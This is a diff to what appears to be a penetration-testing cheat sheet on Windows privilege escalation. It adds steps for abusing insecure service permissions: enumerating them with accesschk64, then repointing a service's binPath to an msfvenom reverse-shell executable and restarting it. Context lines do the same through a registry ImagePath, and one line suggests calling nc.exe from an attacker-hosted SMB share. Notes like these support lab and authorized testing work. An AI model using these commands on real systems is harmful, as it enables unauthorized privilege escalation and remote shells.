@@ -697,6 +697,21 @@ Check with `Get-Acl -Path HKLM:\System\CurrentControlSet\services\regsvc |fl` if
 
 If so, make .exe reverse shell with msfvenom and change the registry key with `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\path\rev.exe /f` and start service with `sc start regsvc`.  
 
+- Insecure service permissions  
+
+Check with `accesschk64.exe -uwcqv *` if you are member of any group. You can restrict output by supplying group parameter, like `accesschk64.exe -uwcqv "Everyone" *`. Look for `SERVICE_CHANGE_CONFIG`, `SERVICE_ALL_ACCESS`, `GENERIC_WRITE`, `GENERIC_ALL`, `WRITE_DAC` or `WRITE_OWNER` permissions.  
+
+If so, you can reconfigure service and supply reverse shell executable made with msfvenom as parameter :
+```
+sc config $SERVICE binPath= "c:\path\rev.exe"
+net stop $SERVICE
+net start $SERVICE
+```
+
+- Alternative to executables  
+
+Instead of reverse shell executables, you can make batch file which calls nc.exe hosted on kali with smbserver (more details below).  
+
 ## Get shells
 
 Didn't know how to name and sort this category.  
